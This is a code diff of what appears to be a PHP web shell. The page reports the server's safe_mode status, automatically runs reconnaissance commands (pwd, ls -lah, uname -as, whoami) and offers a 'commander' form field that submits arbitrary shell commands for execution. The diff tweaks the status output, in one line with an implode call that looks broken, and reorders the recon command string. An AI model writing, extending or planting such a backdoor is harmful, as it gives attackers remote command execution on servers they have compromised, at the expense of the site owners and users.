@@ -186,7 +186,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST"){
         <tr><?=
                 $safemode = ini_get('safe_mode');
                 if ($safemode){
-                    echo "<p> <b>Safe Mode: </b><font color='red'>".$safemode."</font></p>";
+                    echo implode("<p> <b>Safe Mode: </b><font color='red'>".$safemode."</font></p>");
                 }else{
                     echo "<p> <b>Safe Mode is: </b><font style='text-color:green;background-color:lightgrey;'>off.</font</p>";
                 }
@@ -230,7 +230,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST"){
         </div>
         <div><a><br><b> ~ Execute ~ </b><br>
         <?php 
-        $base = 'echo "Current Dir: "; echo "";pwd;ls -lah;echo "System: "; echo "";uname -as;echo "User: ";echo "";whoami';
+        $base = 'echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
         executeCommands($base);
         ?>
         <form method='post' action=''><input type='text' name='commander' value=''><input type='submit' value='Execute'></form>
